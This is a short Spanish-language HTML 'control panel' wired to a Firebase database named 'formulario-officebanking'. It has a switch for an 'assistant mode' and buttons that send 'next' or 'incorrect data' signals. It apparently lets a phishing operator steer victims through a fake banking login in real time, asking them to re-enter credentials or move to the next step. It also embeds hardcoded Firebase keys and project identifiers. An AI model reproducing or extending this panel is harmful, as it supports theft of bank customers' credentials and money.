<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel de Control</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
    }
    .switch {
      position: relative;
      display: inline-block;
      width: 60px;
      height: 34px;
    }
    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    .slider {
      position: absolute;
      cursor: pointer;
      top: 0; left: 0;
      right: 0; bottom: 0;
      background-color: #ccc;
      transition: 0.4s;
      border-radius: 34px;
    }
    .slider:before {
      position: absolute;
      content: "";
      height: 26px; width: 26px;
      left: 4px; bottom: 4px;
      background-color: white;
      transition: 0.4s;
      border-radius: 50%;
    }
    input:checked + .slider {
      background-color: #2196F3;
    }
    input:checked + .slider:before {
      transform: translateX(26px);
    }
    #estado {
      font-weight: bold;
      font-size: 20px;
      margin-left: 10px;
    }
  </style>
</head>
<body>
  <h2>Panel de Control</h2>
  <label class="switch">
    <input type="checkbox" id="modoSwitch" onchange="toggleModo()">
    <span class="slider"></span>
  </label>
  <span id="estado">Cargando...</span>
  <div style="margin-top: 20px;">
    <button onclick="validar('siguiente')" style="padding: 10px 15px; margin-right: 10px;">Siguiente</button>
    <button onclick="validar('error')" style="padding: 10px 15px; background: red; color: white;">Datos Incorrectos</button>
  </div>

  <script>
    function validar(valor) {
      db.ref("validacion_estado").set(valor);
    }
    const firebaseConfig = {
      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
      authDomain: "formulario-officebanking.firebaseapp.com",
      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
      projectId: "formulario-officebanking",
      storageBucket: "formulario-officebanking.appspot.com",
      messagingSenderId: "604053438195",
      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const refModo = db.ref("modo_asistente");

    function toggleModo() {
      const isChecked = document.getElementById("modoSwitch").checked;
      refModo.set(isChecked ? "activo" : "inactivo");
    }

    function actualizarEstado(valor) {
      const estado = document.getElementById("estado");
      const sw = document.getElementById("modoSwitch");
      estado.innerText = valor ? valor.toUpperCase() : "NO DEFINIDO";
      estado.style.color = valor === "activo" ? "green" : "red";
      sw.checked = valor === "activo";
    }

    refModo.on("value", (snapshot) => {
      actualizarEstado(snapshot.val());
    });
  </script>
</body>
</html>
